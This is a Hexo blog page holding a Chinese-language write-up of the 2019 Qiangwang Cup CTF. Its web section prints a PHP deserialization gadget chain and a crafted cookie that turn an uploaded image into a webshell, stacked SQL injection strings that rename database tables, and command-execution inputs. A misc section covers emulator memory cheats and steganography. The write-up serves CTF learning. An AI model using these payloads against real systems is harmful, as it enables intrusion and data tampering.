@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,qwb," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="2019 强网杯">
+<meta property="og:type" content="article">
+<meta property="og:title" content="qwb2019 writeup">
+<meta property="og:url" content="http://yoursite.com/2019/06/07/qwb2019/index.html">
+<meta property="og:site_name" content="0pa9ue">
+<meta property="og:description" content="2019 强网杯">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture17.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture18.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture19.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture21.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture20.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture3.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture4.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture5.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture6.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture2.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture7.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture8.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture9.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture10.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture11.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture12.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture13.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture14.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture15.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture16.png">
+<meta property="article:published_time" content="2019-06-07T04:38:46.000Z">
+<meta property="article:modified_time" content="2019-06-25T16:22:50.455Z">
+<meta property="article:author" content="0pa9ue">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="qwb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/06/07/qwb2019/Picture17.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/07/qwb2019/"/>
+
+
+
+
+
+  <title>qwb2019 writeup | 0pa9ue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0pa9ue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/07/qwb2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0pa9ue">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0pa9ue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">qwb2019 writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-07T12:38:46+08:00">
+                2019-06-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> Views
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>2019 强网杯</strong></p>
+<a id="more"></a>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>注册用户登录后，存在一个上传的功能，并除此之外没有什么别的特别的功能</p>
+<p><img src="/2019/06/07/qwb2019/Picture17.png" alt></p>
+<p>通过简单的fuzz，可以发现该上传功能没有限制文件的类型和内容，但是会将所有上传的文件的文件名进行md5加密后，作为新的文件名，再加上png后缀</p>
+<p><img src="/2019/06/07/qwb2019/Picture18.png" alt></p>
+<p>也就是说我们即使上传一个shell.php后，在服务器中存储的也不是php文件，无法进行getshell</p>
+<p>通过目录扫描工具可以扫出<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> , 大概是需要源码审计</p>
+<p><img src="/2019/06/07/qwb2019/Picture19.png" alt></p>
+<p>该网站使用的是ThinkPHP V5.1.35框架，这个框架是最新版本，通过搜索也没有找到什么很严重的上传漏洞</p>
+<p>找到其中管理登录，上传的文件（Desktop/qwb/web/upload/tp5/application/web）</p>
+<p>在index.php中，发现login_check中存在反序列化<br>其功能是取cookies的值进行反序列化后，对数据库进行操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在Profile.php中，upload_img函数为上传文件功能<br>在对文件的后缀ext进行严格的检查后，使用getimagesize来检查当前内容是否为png，如果这两个条件都成立的话，就执行copy操作，将上传的文件（filename_tmp）copy到服务器中，并删除tmp文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>因为这个ext_check，所以%00截断不能成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $ext_arr=explode(<span class="string">"."</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext=end($ext_arr);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">"png"</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>但是getimagesize可以通过制作图片马绕过（以php形式访问图片马是可以的）<br><a href="https://segmentfault.com/a/1190000003911296" target="_blank" rel="noopener">https://segmentfault.com/a/1190000003911296</a></p>
+<p>所以我们可以利用Profile.php中的upload_img这个函数中的copy功能，将我们已经上传到服务器的图片马复制一份，作为php文件存储在服务器中，即可以getshell</p>
+<p>那么如何调用upload_img？在进一步寻找中，发现Profile.php中存在两个魔术方法__get和__call</p>
+<ul>
+<li>__call：<br>在对象中调用一个不可访问方法时，__call() 会被调用<br>$name 参数是要调用的方法名称。$arguments 参数是一个枚举数组，包含着要传递给方法 $name 的参数<br><a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.overloading.php#object.call</a></li>
+<li>__get：<br>读取不可访问属性的值</li>
+</ul>
+<p>也就是说，现在已经有__call魔术方法可以调用任意类方法，还需要再去寻找一个类，其中调用了一个不可访问的方法，用来触发__call</p>
+<p>Register.php中存在 __destruct 方法，其 $this-&gt;registed、$this-&gt;checker 在反序列化时也是可控的。如果我们将 $this-&gt;checker 赋值为 Register类，而 Register 类没有 index 方法，所以调用的时候就会触发 __call 方法，这样就形成了一条完整的攻击链。<br><a href="https://www.codercto.com/a/84413.html" target="_blank" rel="noopener">https://www.codercto.com/a/84413.html</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>观察__call魔术方法，当this-&gt;{$name}不存在时会触发__get，而__get方法return $this-&gt;except[$name];<br>也就是说， 如果我们让Register类中的checker为Profile的对象，那么在进行__call的过程中，因为Profile中也没有index成员，所以会去调用__get，而__get返回的是按照except的index返回value<br>所以我们只需要让except成员作为一个数组，使得__get返回upload_img这个我们想要调用的函数名即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为在Register.php和Profile.php中类的成员都是public属性，所以剩下的只需要去绕过ext_check的判断，让ext为true（php弱类型相等），并让registered为0，触发__call魔术方法即可</p>
+<p><img src="/2019/06/07/qwb2019/Picture21.png" alt></p>
+<p><strong>payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $filename_tmp = <span class="string">'./upload/122c4a55d1a70cef972cac3982dd49a6/00bf23e130fa1e525e332ff03dae345d.png'</span>;</span><br><span class="line">	<span class="keyword">public</span> $filename = <span class="string">'./upload/122c4a55d1a70cef972cac3982dd49a6/shell.php'</span>;</span><br><span class="line">	<span class="keyword">public</span> $ext = <span class="keyword">true</span>;</span><br><span class="line">	<span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $checker;</span><br><span class="line">	<span class="keyword">public</span> $registed = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Register();</span><br><span class="line">$res = serialize($a);</span><br><span class="line">var_dump($res);</span><br><span class="line">var_dump(urlencode(base64_encode($res)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><font color="grey" size="2">这里需要注意namespace不能省略</font></p>
+<p>cookies</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO0</span><br><span class="line">86MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90</span><br><span class="line">bXAiO3M6Nzg6Ii4vdXBsb2FkLzEyMmM0YTU1ZDFhNzBjZWY5NzJjYWMzOTgyZGQ0OWE2Lz</span><br><span class="line">AwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBuZyI7czo4OiJmaWxlbmFtZSI7</span><br><span class="line">czo1MjoiLi91cGxvYWQvMTIyYzRhNTVkMWE3MGNlZjk3MmNhYzM5ODJkZDQ5YTYvc2hlbG</span><br><span class="line">wyLnBocCI7czozOiJleHQiO2I6MTtzOjY6ImV4Y2VwdCI7YToxOntzOjU6ImluZGV4Ijtz</span><br><span class="line">OjEwOiJ1cGxvYWRfaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2k6MDt9</span><br></pre></td></tr></table></figure>
+
+<p>得到了新的cookies后，将页面中的cookies修改为新的cookies，刷新页面后（会报错），再访问upload目录，就可以看到成功修改的文件了<br><img src="/2019/06/07/qwb2019/Picture20.png" alt></p>
+<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>这一题虽然 or 1=1 等都可以使用，但是却找不到有用的信息，推测flag不再当前的表中，在进行常规的sql注入的过程中遇到了这个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure>
+<p>因为这里过滤了select，所以select from information那一套没用了，无法得到进一步的信息，当时就停在了这里。。</p>
+<p>在复现的时候学习到了一个新的姿势，堆叠注入，本质上是php中的一个可以执行多条sql语句的函数<br>multi_query<br>下面省去寻找过程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/07/qwb2019/Picture3.png" alt></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span> <span class="keyword">from</span> supersqli;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/07/qwb2019/Picture4.png" alt></p>
+<p>从这里可以看出是从words表中选择的数据，flag在这个表名为1919810931114514的表中</p>
+<p>因为过滤了update和select，所以也不能将1919810931114514表中的数据复制到words表中</p>
+<p>这里可以使用alter对表结构进行修改，将words表的表名改为test，1919810931114514表的表名改为words，这样在查找的时候，就能够直接查找到flag了</p>
+<p>因为查找时是根据words表中的id进行选择的，所以我们在这里也需要在1919810931114514表中加一个名为id的列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span> <span class="keyword">from</span> supersqli;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/07/qwb2019/Picture5.png" alt></p>
+<p>修改表名，即拿到flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">test</span>;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span><span class="keyword">rename</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/07/qwb2019/Picture6.png" alt></p>
+<p><font color="d3d3d3" size="2">这里不能够分开写的原因可能是他的逻辑是每次都要保证能查询到结果，如果只执行1&#39;;alter table words rename test;#，那么下一次在执行1&#39;;alter table`1919810931114514` renamewords;#的时候会因为找不到words表而结束查询，从而修改不了1919810931114514表的表名（这里不确定）</font></p>
+<h3 id="强网先锋-上单"><a href="#强网先锋-上单" class="headerlink" title="强网先锋-上单"></a>强网先锋-上单</h3><p>首先进入的是一个目录，搜索了一番后发现有几个信息。</p>
+<ol>
+<li><p>当前的php版本为5.0.23</p>
+</li>
+<li><p>在runtime/12.log和13.log中可以直接看到能命令执行payload</p>
+</li>
+</ol>
+<p><img src="/2019/06/07/qwb2019/Picture2.png" alt></p>
+<p>直接寻找flag:</p>
+<ul>
+<li>vars[0] = find / -name *flag*</li>
+<li>vars[0] = cat /flag</li>
+</ul>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="鲲or鳗orGame"><a href="#鲲or鳗orGame" class="headerlink" title="鲲or鳗orGame"></a>鲲or鳗orGame</h3><p>打开题目后是两个音频和一个游戏，分别下载下来游戏为 game.gb</p>
+<p><img src="/2019/06/07/qwb2019/Picture7.png" alt></p>
+<p>在对音频一顿分析后(MP3stego, Audicaty)，没有发现什么隐藏的信息，进而转向 game.gb.</p>
+<p>查找一下gb格式的文件的信息</p>
+<p><img src="/2019/06/07/qwb2019/Picture8.png" alt></p>
+<p>发现是一个GameBoy的游戏，去官网下载GameBoy的模拟器</p>
+<p><a href="http://visualboyadvance.net" target="_blank" rel="noopener">http://visualboyadvance.net</a></p>
+<p>用visualboyadvance打开gb文件，可以看到是一个类似flappy bird的游戏</p>
+<p>进去试玩一通后，发现没有什么别的奇怪的关卡之类的东西，只能去研究一下这个模拟器的功能</p>
+<p>在研究模拟器的时候，发现VBA可以用来作弊</p>
+<p><img src="/2019/06/07/qwb2019/Picture9.png" alt></p>
+<p>看到这个页面就可以大致知道是要对游戏中的某些值进行修改，然后拿flag了</p>
+<p>而且因为这个游戏只有两个数值，一个result和best，所以尝试修改这两个值</p>
+<p><img src="/2019/06/07/qwb2019/Picture10.png" alt></p>
+<p>操作流程大致是:</p>
+<ol>
+<li>在准备开始阶段选择old value/Equal/8 bits（这里系统默认选的是32<br>bits，一直调试不出来。后来是想到这个值可能没有32bits），选择start后关闭，进入游戏</li>
+</ol>
+<p><img src="/2019/06/07/qwb2019/Picture11.png" alt></p>
+<ol start="2">
+<li>通过第一个柱子，让best为1之后，等待下一个准备开始阶段到来。</li>
+</ol>
+<p>选择old value/Greater than/search</p>
+<p><img src="/2019/06/07/qwb2019/Picture12.png" alt></p>
+<ol start="3">
+<li>重复2操作一次（这次需要通过两根柱子，让best为2）应该就可以找到代表best的地址了</li>
+</ol>
+<p><img src="/2019/06/07/qwb2019/Picture13.png" alt></p>
+<p><font color="grey">这里我的best是由2变为4</font></p>
+<ol start="4">
+<li>add cheat 并修改值为255（8 bits的最大值）</li>
+</ol>
+<p><img src="/2019/06/07/qwb2019/Picture14.png" alt></p>
+<ol start="5">
+<li>即拿到flag值</li>
+</ol>
+<p><img src="/2019/06/07/qwb2019/Picture15.png" alt></p>
+<p>flag{PS03R49UE576R421RE8}</p>
+<h3 id="强网先锋-打野"><a href="#强网先锋-打野" class="headerlink" title="强网先锋-打野"></a>强网先锋-打野</h3><p>使用zsteg工具查看bmp图片的隐藏信息<br><a href="https://github.com/zed-0xff/zsteg" target="_blank" rel="noopener">https://github.com/zed-0xff/zsteg</a></p>
+<p><img src="/2019/06/07/qwb2019/Picture16.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/qwb/" rel="tag"># qwb</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
